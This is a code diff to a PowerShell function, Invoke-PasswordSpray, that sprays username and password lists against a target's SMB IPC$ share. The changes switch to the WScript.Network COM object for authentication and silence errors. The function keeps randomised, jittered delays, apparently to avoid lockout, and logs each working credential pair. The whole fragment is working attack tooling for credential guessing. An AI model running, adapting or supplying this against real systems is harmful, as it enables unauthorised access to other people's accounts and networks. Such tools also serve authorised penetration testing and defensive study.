@@ -52,15 +52,17 @@ function Invoke-PasswordSpray
     )
     $Result=@()
     $Random = New-Object System.Random
+    $Network = New-Object -ComObject WScript.Network
+    $ErrorActionPreference = "SilentlyContinue"
     foreach($User in $Users)
     {
       foreach($Password in $Passwords)
       {
         Start-Sleep $Random.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
-        if((New-SmbMapping -RemotePath \\$Target\IPC$ -UserName $User -Password $Password 2>&1).Status -eq "OK")
+        if(($Network.MapNetworkDrive("",("\\" + $Target + "\IPC$"), $False, $User, $Password)) -eq $Null)
         {
           $Result += ((Get-Date -Format [hh:mm:ss]) + " " + $Target + ":" + $User + ":" + $Password)
-          Remove-SmbMapping -RemotePath \\$Target\IPC$ -Force -Confirm 2>&1 | Out-Null
+          $Network.RemoveNetworkDrive("\\" + $Target + "\IPC$") 2>&1
           break
         }
       }
@@ -99,7 +101,6 @@ function Invoke-PasswordSpray
   {
     foreach($Result in (Wait-Job -Name $JobName | Receive-Job)){$Result}
     Remove-Job -Name $JobName -Force
-    Remove-SmbMapping -RemotePath \\$JobName[0]\IPC$ -Force -Confirm
   }
   Write-Host ((Get-Date -Format [hh:mm:ss]) + " All Jobs Complete. ")
 }
